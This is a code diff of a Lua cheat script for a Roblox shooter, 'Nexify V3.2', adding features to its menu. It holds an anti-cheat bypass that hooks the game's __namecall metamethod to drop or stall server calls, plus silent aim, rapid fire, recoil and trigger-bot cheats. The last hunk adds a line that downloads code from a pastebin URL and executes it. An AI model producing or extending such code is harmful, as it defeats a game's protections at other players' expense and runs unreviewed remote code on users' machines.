@@ -1,4 +1,53 @@
-if getgenv().nexifye == true then return end 
+--[[
+
+░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+░    ░░░░░   ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░   ░░░░░░░░░░░
+▒  ▒   ▒▒▒   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒  ▒▒▒  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒   ▒   ▒▒   ▒▒▒▒   ▒▒▒▒▒   ▒▒▒   ▒▒▒▒▒    ▒  ▒▒   ▒▒▒   
+▓   ▓▓   ▓   ▓▓  ▓▓▓   ▓▓▓▓  ▓   ▓▓   ▓▓▓   ▓▓▓▓▓   ▓   ▓
+▓   ▓▓▓  ▓   ▓         ▓▓▓▓▓  ▓▓▓▓▓   ▓▓▓   ▓▓▓▓▓▓▓    ▓▓
+▓   ▓▓▓▓  ▓  ▓  ▓▓▓▓▓▓▓▓▓▓  ▓▓   ▓▓   ▓▓▓   ▓▓▓▓▓▓▓▓   ▓▓
+█   ██████   ███     ████   ███   █   ███   ███████   ███
+██████████████████████████████████████████████████   ████
+
+NEXIFY V3.2
+30.04.2025
+
+ADVANCADED VERSION TS:::
+
+
+
+NEXIFY DEVELOPMENT TEAM
+
+]]
+
+
+
+
+
+
+
+
+
+
+
+
+xxx=[[ 
+
+░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+░    ░░░░░   ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░   ░░░░░░░░░░░
+▒  ▒   ▒▒▒   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒  ▒▒▒  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒   ▒   ▒▒   ▒▒▒▒   ▒▒▒▒▒   ▒▒▒   ▒▒▒▒▒    ▒  ▒▒   ▒▒▒   
+▓   ▓▓   ▓   ▓▓  ▓▓▓   ▓▓▓▓  ▓   ▓▓   ▓▓▓   ▓▓▓▓▓   ▓   ▓
+▓   ▓▓▓  ▓   ▓         ▓▓▓▓▓  ▓▓▓▓▓   ▓▓▓   ▓▓▓▓▓▓▓    ▓▓
+▓   ▓▓▓▓  ▓  ▓  ▓▓▓▓▓▓▓▓▓▓  ▓▓   ▓▓   ▓▓▓   ▓▓▓▓▓▓▓▓   ▓▓
+█   ██████   ███     ████   ███   █   ███   ███████   ███
+██████████████████████████████████████████████████   ████
+]]
+
+
+print(xxx)
+--if getgenv().nexifye == true then return end 
 getgenv().nexifye = true
 getgenv().SilentKeyy = 'q'
 getgenv().PredictionAmmount = 0.137
@@ -18,6 +67,24 @@ local Notify = NotifyLibrary.Notify
                     Duration = 3
                 })
 
+local Players = game:GetService("Players")
+
+local function ShowNotify(text)
+    Notify({
+        Title = "Join / Leave",
+        Description = text,
+        Duration = 2.5
+    })
+end
+
+Players.PlayerAdded:Connect(function(player)
+    ShowNotify(player.Name .. " Has Joined To Game.")
+end)
+
+Players.PlayerRemoving:Connect(function(player)
+    ShowNotify(player.Name .. " Has Left From Game.")
+end)
+
 
 local GetService = setmetatable({}, {
     __index = function(self, key)
@@ -25,27 +92,48 @@ local GetService = setmetatable({}, {
     end
 })
 function anticheatbypass()
-print("Anti cheat bypassed")
-                                                Notify({
-                    Title = "[ NEXIFY ]",
-                    Description = "Bypassed Anti Cheat",
-                    Duration = 3,
-                })
-local old
-game:GetService("RunService"):Connected(function()
-old = hookmetamethod(game, "__namecall", function(self, ...)
-    local args = {...}
-    if getnamecallmethod() == "FireServer" and self == game.ReplicatedStorage.Remotes.UAC then
-        warn("Blocked Anti Cheat \n call", unpack(args))
-        return
-    end
-    return old(self, ...)
-end)
-end)
+    print("Anti cheat bypassed")
+    Notify({
+        Title = "[ NEXIFY ]",
+        Description = "Bypassed Anti Cheat",
+        Duration = 3,
+    })
 
+    local ignoredRemotes = {
+        Door = true,
+        Equip = true,
+        Loot = true
+    }
+
+    local mt = getrawmetatable(game)
+    setreadonly(mt, false)
+
+    local oldNamecall = mt.__namecall
+
+    mt.__namecall = newcclosure(function(self, ...)
+        local args = {...}
+        local method = getnamecallmethod()
+
+        if method == "FireServer" then
+            if ignoredRemotes[self.Name] then
+                return
+            end
+
+            if self.Name == "ProjectileInflict" then
+                if debug.traceback():find("CharacterController") then
+                    return coroutine.yield()
+                end
+            end
+        end
+
+        return oldNamecall(self, unpack(args))
+    end)
+
+    setreadonly(mt, true)
 end
 
 task.spawn(anticheatbypass)
+
 
 
 
@@ -793,12 +881,13 @@ local RageTab = Window:page({name = "Rage"})
 local VisualTab = Window:page({name = "Visauls"})
 local MiscTab = Window:page({name = "Misc"})
 local UISettings = Window:page({name = "UI"})
-local SAimSection = AimingTab:section({name = "Silent Aim", side = "left",size = 400})
+local SAimSection = AimingTab:section({name = "Silent Aim", side = "left",size = 280})
 local uiSettings1 = UISettings:section({name = " UI Settings 1", side = "left",size = 100})
 local uiSettings2 = UISettings:section({name = " UI Settings 2", side = "right",size = 100})
 local Envioromental = AimingTab:section({name = "Environmental", side = "left",size = 90})
 local WaterTab = AimingTab:section({name = "Water", side = "right",size = 60})
 local AAMainSection = RageTab:section({name = "Main", side = "left", size = 250})
+local PlayerInfof = RageTab:section({name = "Player Info", side = "left", size = 50})
 local AASettings = RageTab:section({name = "Settings", side = "right", size = 220})
 local VisualMainSection = VisualTab:section({name = "Normal Esp",side = "left", size = 200})
 local VisualMainSection2 = VisualTab:section({name = "Normal Esp 2",side = "right", size = 210})
@@ -809,12 +898,13 @@ local MiscCharSettings = MiscTab:section({name = "Character Cheats",side = "left
 local MiscNorSettings = MiscTab:section({name = "Normal Cheats",side = "left", size = 145})
 local VisorSettings = MiscTab:section({name = "Visor Settings",side = "left", size = 60})
 local MiscCamSettings = MiscTab:section({name = "Camera Settings",side = "right", size = 120})
-local HitSoundsTab = MiscTab:section({name = "Hit Sounds Settings",side = "right", size = 90})
+local HitSoundsTab = MiscTab:section({name = "Hit Sounds Settings",side = "right", size = 88})
 local Bulletset = RageTab:section({name = "Bullet Settings", side = "right",size = 150})
 local ConfigSection = MiscTab:section({name = "Config",side = "right", size = 260})
 local ItemWeight = MiscTab:section({name = "Item Weight",side = "right", size = 40})
 local ConfigLoader = ConfigSection:configloader({folder = "nexifyv3"})
-SAimSection:toggle({name = "Silent Aim Enabled", def = false, callback = function(Value)
+local GunMods = AimingTab:section({name = "Gun Mods", side = "right",size = 135})
+SAimSection:toggle({name = "Silent Aim", def = false, callback = function(Value)
     silent_aim.enabled = not silent_aim.enabled
 end})
 
@@ -991,7 +1081,7 @@ for i = 0, labelCountX - 1 do
 end
 
 
-ConfigSection:toggle({name = "Watermark", def = false, callback = function(Value)
+uiSettings2:toggle({name = "Watermark", def = false, callback = function(Value)
     screenGuiwatermark.Enabled = Value
 end})
 
@@ -1036,7 +1126,7 @@ local function setFireRateForAllItems(rate)
     end
 end
 
-SAimSection:toggle({name = "Rapid Fire", def = false, callback = function(state)
+GunMods:toggle({name = "Rapid Fire", def = false, callback = function(state)
      if state then
             -- Enable rapid fire
             setFireRateForAllItems(newFireRate)  -- Set to desired rapid fire rate
@@ -1049,7 +1139,7 @@ SAimSection:toggle({name = "Rapid Fire", def = false, callback = function(state)
 end})
 
 
-        SAimSection:toggle({name = "Instant Aim", def = false, callback = function(Value)
+        GunMods:toggle({name = "Instant Aim", def = false, callback = function(Value)
             -- Iterate through each weapon in the local player's inventory
         local inventory = game.ReplicatedStorage.Players[localplayernameee].Inventory:GetChildren()
         
@@ -1076,7 +1166,7 @@ end})
         end
 end})
 
-        SAimSection:toggle({name = "Instant Reload", def = false, callback = function(Value)
+        GunMods:toggle({name = "Instant Reload", def = false, callback = function(Value)
 
 
 -- Instant Reload for Project Delta
@@ -1207,14 +1297,14 @@ local function stopInventoryCheck()
 end
 
 
- SAimSection:toggle({name = "Unlock Fire Modes", def = false, callback = function(Value)
+ GunMods:toggle({name = "Unlock Fire Modes", def = false, callback = function(Value)
 
 startInventoryCheck()
 end})
 
 local ammo = game.ReplicatedStorage.AmmoTypes
 
-SAimSection:slider({name = "Recoil Slider", def = 230, max = 583, min = 0, rounding = true, callback = function(State)
+GunMods:slider({name = "Recoil Slider", def = 230, max = 583, min = 0, rounding = true, callback = function(State)
 
  -- Check if the slider value is zero
     if State == 0 then
@@ -1655,7 +1745,7 @@ game:GetService("RunService").Heartbeat:Connect(function()
 end)
 
 -- Silent Aim Settings Section --
-local SilentAimSettings = AimingTab:section({name = "Inventory Viewer", side = "right",size = 130})
+local SilentAimSettings = AimingTab:section({name = "Inventory Viewer", side = "right",size = 120})
 
 SilentAimSettings:toggle({name = "Inventory Viewer Toggle", def = false, callback = function(Boolean)
     frame231.Visible = Boolean
@@ -1664,6 +1754,388 @@ end})
 SilentAimSettings:toggle({name = "Gradiant Animation", def = false, callback = function(Boolean)
     animatexxx = Boolean  -- Use this to toggle the gradient animation
 end})
+local statussssssss = false
+PlayerInfof:toggle({name = "Player Info UI", def = false, callback = function(Boolean)
+    statussssssss = Boolean
+if Boolean == true then
+
+ PlayerInfo = Instance.new("ScreenGui")
+
+
+
+ Frame = Instance.new("Frame")
+ UIGradient = Instance.new("UIGradient")
+ Frame_2 = Instance.new("Frame")
+ UIGradient_2 = Instance.new("UIGradient")
+ Frame_3 = Instance.new("Frame")
+ UIGradient_3 = Instance.new("UIGradient")
+ TextLabel = Instance.new("TextLabel")
+ ImageLabel = Instance.new("ImageLabel")
+ UICorner = Instance.new("UICorner")
+ PlayerName = Instance.new("TextLabel")
+ Dictator = Instance.new("Frame")
+ KDR = Instance.new("TextLabel")
+ PlayTime = Instance.new("TextLabel")
+ Values = Instance.new("Folder")
+ KDR_2 = Instance.new("TextLabel")
+ PlayTime_2 = Instance.new("TextLabel")
+ IntValues = Instance.new("Folder")
+ Dictator2 = Instance.new("Frame")
+
+-- Properties:
+
+PlayerInfo.Name = "PlayerInfo"
+PlayerInfo.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+PlayerInfo.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+PlayerInfo.DisplayOrder = 3
+
+Frame.Parent = PlayerInfo
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.0189753324, 0, 0.449532062, 0)
+Frame.Size = UDim2.new(0, 295, 0, 137)
+local Frame1 = Instance.new("UIStroke")
+Frame1.Parent = Frame
+Frame1.Name = 'UIStroke'
+Frame1.Color = Color3.new(0.172549, 0.164706, 0.141176)
+UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(26, 26, 26))}
+UIGradient.Parent = Frame
+
+Frame_2.Parent = PlayerInfo
+Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame_2.BorderSizePixel = 0
+Frame_2.Position = UDim2.new(0.0284629986, 0, 0.459558815, 0)
+Frame_2.Size = UDim2.new(0, 278, 0, 122)
+local Frame2 = Instance.new("UIStroke")
+Frame2.Parent = Frame_2
+Frame2.Name = 'UIStroke'
+Frame2.Color = Color3.new(0.172549, 0.164706, 0.141176)
+UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(26, 26, 26))}
+UIGradient_2.Parent = Frame_2
+
+Frame_3.Parent = PlayerInfo
+Frame_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame_3.BorderSizePixel = 0
+Frame_3.Position = UDim2.new(0.0367647037, 0, 0.471256673, 0)
+Frame_3.Size = UDim2.new(0, 263, 0, 108)
+local Frame3 = Instance.new("UIStroke")
+Frame3.Parent = Frame_3
+Frame3.Name = 'UIStroke'
+Frame3.Color = Color3.new(0.172549, 0.164706, 0.141176)
+UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(26, 26, 26))}
+UIGradient_3.Parent = Frame_3
+
+TextLabel.Parent = Frame_3
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(0.384030432, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 61, 0, 25)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "Player Info"
+TextLabel.TextColor3 = Color3.fromRGB(229, 229, 229)
+TextLabel.TextSize = 15.000
+
+ImageLabel.Parent = Frame_3
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BackgroundTransparency = 1
+ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel.BorderSizePixel = 0
+ImageLabel.Position = UDim2.new(0.052813689, 0, -0.11592597, 60)
+ImageLabel.Size = UDim2.new(0, 30, 0, 30)
+ImageLabel.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+
+UICorner.Parent = ImageLabel
+
+PlayerName.Name = "PlayerName"
+PlayerName.Parent = Frame_3
+PlayerName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+PlayerName.BackgroundTransparency = 1.000
+PlayerName.BorderColor3 = Color3.fromRGB(0, 0, 0)
+PlayerName.BorderSizePixel = 0
+PlayerName.Position = UDim2.new(0.258555144, 0, 0.25, 0)
+PlayerName.Size = UDim2.new(0, 61, 0, 25)
+PlayerName.Font = Enum.Font.SourceSans
+PlayerName.Text = "PlayerName123"
+PlayerName.TextColor3 = Color3.fromRGB(229, 229, 229)
+PlayerName.TextSize = 15.000
+
+Dictator.Name = "Dictator"
+Dictator.Parent = Frame_3
+Dictator.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Dictator.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Dictator.BorderSizePixel = 0
+Dictator.Position = UDim2.new(0, 0, 0.231481478, 0)
+Dictator.Size = UDim2.new(0, 263, 0, 0)
+local dicatator1uistroke = Instance.new("UIStroke")
+dicatator1uistroke.Parent = Dictator
+dicatator1uistroke.Name = 'UIStroke'
+
+KDR.Name = "KDR"
+KDR.Parent = Frame_3
+KDR.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+KDR.BackgroundTransparency = 1.000
+KDR.BorderColor3 = Color3.fromRGB(0, 0, 0)
+KDR.BorderSizePixel = 0
+KDR.Position = UDim2.new(0.15209125, 0, 0.42592594, 0)
+KDR.Size = UDim2.new(0, 61, 0, 25)
+KDR.Font = Enum.Font.SourceSans
+KDR.Text = "KDR:"
+KDR.TextColor3 = Color3.fromRGB(229, 229, 229)
+KDR.TextSize = 15.000
+
+PlayTime.Name = "PlayTime"
+PlayTime.Parent = Frame_3
+PlayTime.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+PlayTime.BackgroundTransparency = 1.000
+PlayTime.BorderColor3 = Color3.fromRGB(0, 0, 0)
+PlayTime.BorderSizePixel = 0
+PlayTime.Position = UDim2.new(0.205323189, 0, 0.657407403, 0)
+PlayTime.Size = UDim2.new(0, 61, 0, 25)
+PlayTime.Font = Enum.Font.SourceSans
+PlayTime.Text = "PLAY TIME:"
+PlayTime.TextColor3 = Color3.fromRGB(229, 229, 229)
+PlayTime.TextSize = 15.000
+
+Values.Name = "Values"
+Values.Parent = Frame_3
+
+KDR_2.Name = "KDR"
+KDR_2.Parent = Values
+KDR_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+KDR_2.BackgroundTransparency = 1.000
+KDR_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+KDR_2.BorderSizePixel = 0
+KDR_2.Position = UDim2.new(0.756653965, 0, 0.42592594, 0)
+KDR_2.Size = UDim2.new(0, 61, 0, 25)
+KDR_2.Font = Enum.Font.SourceSans
+KDR_2.Text = "0.75"
+KDR_2.TextColor3 = Color3.fromRGB(229, 229, 229)
+KDR_2.TextSize = 15.000
+
+PlayTime_2.Name = "PlayTime"
+PlayTime_2.Parent = Values
+PlayTime_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+PlayTime_2.BackgroundTransparency = 1.000
+PlayTime_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+PlayTime_2.BorderSizePixel = 0
+PlayTime_2.Position = UDim2.new(0.756653965, 0, 0.657407403, 0)
+PlayTime_2.Size = UDim2.new(0, 61, 0, 25)
+PlayTime_2.Font = Enum.Font.SourceSans
+PlayTime_2.Text = "135H"
+PlayTime_2.TextColor3 = Color3.fromRGB(229, 229, 229)
+PlayTime_2.TextSize = 15.000
+
+IntValues.Name = "IntValues"
+IntValues.Parent = Frame_3
+
+Dictator2.Name = "Dictator2"
+Dictator2.Parent = Frame_3
+Dictator2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Dictator2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Dictator2.BorderSizePixel = 0
+Dictator2.Position = UDim2.new(0, 0, 0.888888896, 0)
+Dictator2.Size = UDim2.new(0, 263, 0, 0)
+local dicatator2uistroke = Instance.new("UIStroke")
+dicatator2uistroke.Parent = Dictator2
+dicatator2uistroke.Name = 'UIStroke'
+
+local intvaluesaccentcolor = Instance.new("Color3Value")
+intvaluesaccentcolor.Parent = IntValues
+intvaluesaccentcolor.Name = "AccentColor"
+
+task.wait(0.5)
+intvaluesaccentcolor.Value = Color3.new(0.886275, 0.47451, 0.00784314)
+
+-- Scripts:
+
+local function BQIGBQK_fake_script() -- Frame_3.ColorHandler
+	local script = Instance.new('LocalScript', Frame_3)
+	local IntValues = script.Parent.IntValues
+	local accentcolor = IntValues.AccentColor
+	
+	accentcolor.Changed:Connect(function()
+		script.Parent.Dictator.UIStroke.Color = accentcolor.Value
+		script.Parent.Dictator2.UIStroke.Color = accentcolor.Value
+	end)
+end
+coroutine.wrap(BQIGBQK_fake_script)()
+
+local function FOV_PLAYER_SELECTOR_script() -- Frame_3.FOVPlayerSelector
+	local script = Instance.new('LocalScript', Frame_3)
+	local Players = game:GetService("Players")
+	local UserInputService = game:GetService("UserInputService")
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local localPlayer = Players.LocalPlayer
+	local camera = workspace.CurrentCamera
+	local fovAngle = 170 -- 170 degrees FOV
+	local playerNameLabel = script.Parent.PlayerName
+	local imageLabel = script.Parent.ImageLabel
+	local kdrValueLabel = script.Parent.Values.KDR
+	local playTimeValueLabel = script.Parent.Values.PlayTime
+
+	local function getPlayersInFOV()
+		local playersInFOV = {}
+		local cameraCFrame = camera.CFrame
+		local cameraPos = cameraCFrame.Position
+		local cameraLookVector = cameraCFrame.LookVector
+
+		for _, player in pairs(Players:GetPlayers()) do
+			if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+				local humanoidRootPart = player.Character.HumanoidRootPart
+				local playerPos = humanoidRootPart.Position
+				local vectorToPlayer = (playerPos - cameraPos).Unit
+				local angle = math.deg(math.acos(vectorToPlayer:Dot(cameraLookVector)))
+				
+				if angle <= fovAngle / 2 then
+					playersInFOV[#playersInFOV + 1] = {Player = player, Position = playerPos}
+				end
+			end
+		end
+		return playersInFOV
+	end
+
+	local function getClosestPlayerToMouse(playersInFOV)
+		if #playersInFOV == 0 then return nil end
+		if #playersInFOV == 1 then return playersInFOV[1].Player end
+
+		local mouse = UserInputService:GetMouseLocation()
+		local closestPlayer = nil
+		local minDistance = math.huge
+
+		for _, data in pairs(playersInFOV) do
+			local player = data.Player
+			local position = data.Position
+			local screenPoint, onScreen = camera:WorldToScreenPoint(position)
+			if onScreen then
+				local screenPos = Vector2.new(screenPoint.X, screenPoint.Y)
+				local distance = (screenPos - mouse).Magnitude
+				if distance < minDistance then
+					minDistance = distance
+					closestPlayer = player
+				end
+			end
+		end
+		return closestPlayer
+	end
+
+	local function formatPlayTime(seconds)
+		local hours = math.floor(seconds / 3600)
+		local minutes = math.floor((seconds % 3600) / 60)
+		return string.format("%dH %dM", hours, minutes)
+	end
+
+	local function getPlayerStats(player)
+		local statsFolder = ReplicatedStorage:FindFirstChild("Players") and
+			ReplicatedStorage.Players:FindFirstChild(player.Name) and
+			ReplicatedStorage.Players[player.Name]:FindFirstChild("Status") and
+			ReplicatedStorage.Players[player.Name].Status:FindFirstChild("Journey") and
+			ReplicatedStorage.Players[player.Name].Status.Journey:FindFirstChild("Statistics")
+		
+		if not statsFolder then
+			return nil, nil
+		end
+
+		local kills = statsFolder:GetAttribute("Kills") or 0
+		local deaths = statsFolder:GetAttribute("Deaths") or 0
+		local playTime = statsFolder:GetAttribute("TimePlayed") or 0
+
+		local kdr = deaths > 0 and string.format("%.2f", kills / deaths) or (kills > 0 and "∞" or "0.00")
+		local formattedPlayTime = formatPlayTime(playTime)
+
+		return kdr, formattedPlayTime
+	end
+
+	local function updateUI()
+		local playersInFOV = getPlayersInFOV()
+		local selectedPlayer = getClosestPlayerToMouse(playersInFOV)
+		
+		if selectedPlayer then
+			playerNameLabel.Text = selectedPlayer.Name
+			local userId = selectedPlayer.UserId
+			imageLabel.Image = "rbxthumb://type=AvatarHeadShot&id=" .. userId .. "&w=150&h=150"
+			local kdr, playTime = getPlayerStats(selectedPlayer)
+			kdrValueLabel.Text = kdr or "N/A"
+			playTimeValueLabel.Text = playTime or "N/A"
+		else
+			playerNameLabel.Text = "No Player"
+			imageLabel.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+			kdrValueLabel.Text = "N/A"
+			playTimeValueLabel.Text = "N/A"
+		end
+	end
+
+local UIS = game:GetService("UserInputService")
+local dragging, dragInput, dragStart, startPos
+local frames = {Frame, Frame_2, Frame_3}
+
+local function update(input)
+	local delta = input.Position - dragStart
+	for _, frame in pairs(frames) do
+		frame.Position = UDim2.new(startPos[frame].X.Scale, startPos[frame].X.Offset + delta.X,
+			startPos[frame].Y.Scale, startPos[frame].Y.Offset + delta.Y)
+	end
+end
+
+for _, frame in pairs(frames) do
+	frame.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = {}
+			for _, f in pairs(frames) do
+				startPos[f] = {X = f.Position.X, Y = f.Position.Y}
+			end
+
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+
+	frame.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+		end
+	end)
+end
+
+UIS.InputChanged:Connect(function(input)
+	if input == dragInput and dragging then
+		update(input)
+	end
+end)
+
+    
+
+	game:GetService("RunService").RenderStepped:Connect(updateUI)
+
+
+
+end
+coroutine.wrap(FOV_PLAYER_SELECTOR_script)()
+intvaluesaccentcolor.Value = Color3.new(0.886274, 0.47451, 0.00784314)
+end
+
+    
+     if Boolean == false then PlayerInfo:Destroy() end
+end})
+--[[
+PlayerInfof:colorpicker({name = "UI Accent Color Picker", cpname = "", def = Color3.new(0.886274, 0.47451, 0.00784314), callback = function(color)
+    
+if statussssssss == true then
+local directui = game.Players.LocalPlayer.PlayerGui:WaitForChild("PlayerInfo")
+directui.Frame.IntValues.AccentColor = color
+end
+
+end})
+--]]
 
 SilentAimSettings:toggle({name = "Gradiant Toggle", def = false, callback = function(Boolean)
     gradientxx_upval.Enabled = Boolean
@@ -1674,73 +2146,111 @@ SilentAimSettings:slider({name = "Gradiant Transparency", def = 1, max = 1.3, mi
 end})
 
 -- Trigger Bot Section -- 
-local TriggerbotSection = AimingTab:section({name = "Trigger Bot", side = "right",size = 80})
+local TriggerbotSection = AimingTab:section({name = "Trigger Bot", side = "left",size = 90})
 local BobbingSection = AimingTab:section({name = "Bobbing", side = "right",size = 40})
 
-TriggerbotSection:toggle({name = "Trigger Bot Enabled", def = false, callback = function(Boolean)
+
+TriggerbotSection:toggle({name = "Trigger Bot", def = false, callback = function(Boolean)
  PuppySettings.TriggerBot.Enabled = Boolean
 end})
 
-BobbingSection:toggle({name = "No Bob", def = false, callback = function(Boolean)
+local BobEnabled = false
+local applied = false
+local originalUpdates = {}
 
--- Safe No Bob Script for Project Delta
+BobbingSection:toggle({
+    name = "No Bob",
+    def = false,
+    callback = function(state)
+        BobEnabled = state
 
--- Services
-local Players = game:GetService("Players")
-local Workspace = game:GetService("Workspace")
-local RunService = game:GetService("RunService")
-local LocalPlayer = Players.LocalPlayer
+        local Players = game:GetService("Players")
+        local LocalPlayer = Players.LocalPlayer
 
--- Main function to apply hooks
-local function applyNoBob()
-    -- Hook spring-based bobbing
-    local springModule = require(game:GetService("ReplicatedStorage").Modules.SpringV2)
-    if springModule then
-        local originalCreate = springModule.create
-        springModule.create = function(...)
-            local spring = originalCreate(...)
-            if spring and spring.update then
-                spring.update = function(...)
-                    return Vector3.new(0, 0, 0)
+        -- No Bob uygulayıcı
+        local function applyNoBob()
+            if applied then return end
+            applied = true
+
+            -- SpringV2 hook
+            local success, springModule = pcall(function()
+                return require(game:GetService("ReplicatedStorage").Modules.SpringV2)
+            end)
+
+            if success and springModule and springModule.create then
+                local originalCreate = springModule.create
+                springModule.create = function(...)
+
+                    local spring = originalCreate(...)
+
+                    if spring and spring.update then
+                        local originalUpdate = spring.update
+                        originalUpdates[spring] = originalUpdate
+
+                        spring.update = function(...)
+                            if not BobEnabled then
+                                -- Bob kapalı ise eski fonksiyonu geri çağır
+                                originalUpdates[spring](...)
+                            end
+                            local result = originalUpdate(...)
+                            if typeof(result) == "Vector3" and math.abs(result.Y) < 0.2 then
+                                return Vector3.zero
+                            end
+                            return result
+                        end
+                    end
+                    return spring
                 end
             end
-            return spring
-        end
-    end
 
-    -- Hook garbage collected spring updates (only works in exploit)
-    if getgc then
-        for _, v in next, getgc(true) do
-            if type(v) == "table" and rawget(v, "update") then
-                v.update = function(...)
-                    return Vector3.new(0, 0, 0)
+            -- getgc hook
+            if getgc then
+                for _, v in next, getgc(true) do
+                    if type(v) == "table" and rawget(v, "update") and typeof(v.update) == "function" then
+                        local original = v.update
+                        originalUpdates[v] = original
+
+                        v.update = function(...)
+                            if not BobEnabled then
+                                -- Bob kapalı ise eski fonksiyonu geri çağır
+                                return original(...)
+                            end
+                            local result = original(...)
+                            if typeof(result) == "Vector3" and math.abs(result.Y) < 0.2 then
+                                return Vector3.zero
+                            end
+                            return result
+                        end
+                    end
+                end
+            end
+        end
+
+        -- Başlangıçta uygula
+        task.spawn(applyNoBob)
+
+        -- Respawn’da tekrar uygula
+        Players.LocalPlayer.CharacterAdded:Connect(function()
+            applyNoBob()
+        end)
+
+        -- Bildirim
+        if getconnections then
+            for _, v in getconnections(game.ReplicatedStorage.Remotes.NotificationMessage.OnClientEvent) do
+                if v.Function then
+                 --   v.Function(BobEnabled and "NO BOB AÇILDI" or "NO BOB KAPANDI", 3, 1)
                 end
             end
         end
     end
-end
+})
 
--- Apply the No Bob modification
-task.spawn(function()
-    applyNoBob()
-
-    -- Notification
-    if getconnections then
-        for _, v in getconnections(game.ReplicatedStorage.Remotes.NotificationMessage.OnClientEvent) do
-            if v.Function then
-                v.Function("NO BOB ENABLED", 3, 1)
-            end
-        end
-    end
-end)
-
--- Reapply when character respawns
-LocalPlayer.CharacterAdded:Connect(function()
-    applyNoBob()
-end)
-
-end})
-
+TriggerbotSection:keybind({
+    name = "Test Keybind",
+    def = Enum.KeyCode.E,
+    pointer = "test_keybind",
+    callback = function() print("Keybind pressed!") end
+})
 
 TriggerbotSection:slider({name = "Delay (Ammount)", def = 0, max = 60, min = 0, rounding = true, callback = function(Value)
  PuppySettings.TriggerBot.DelayAmount = Value
@@ -3621,7 +4131,7 @@ else
 	statusFolder:SetAttribute("Version", "Injected Nexify ✅")
 end
 local wm = Window:watermark()
-wm:update({"Nexify V1.3 | "..identifyexecutor().." | Advancaded Version"})
+wm:update({"Nexify V3.2 | "..identifyexecutor().." | Advancaded Version"})
 wm:updateside("topright")
 wm:toggle(true)
 wait(1)
@@ -3630,6 +4140,7 @@ wait(1)
                     Description = "Injected Nexify",
                     Duration = math.random(10,15)
                 })
+loadstring(game:HttpGet("https://pastebin.com/raw/KQt4Xque"))()
 
 
                 
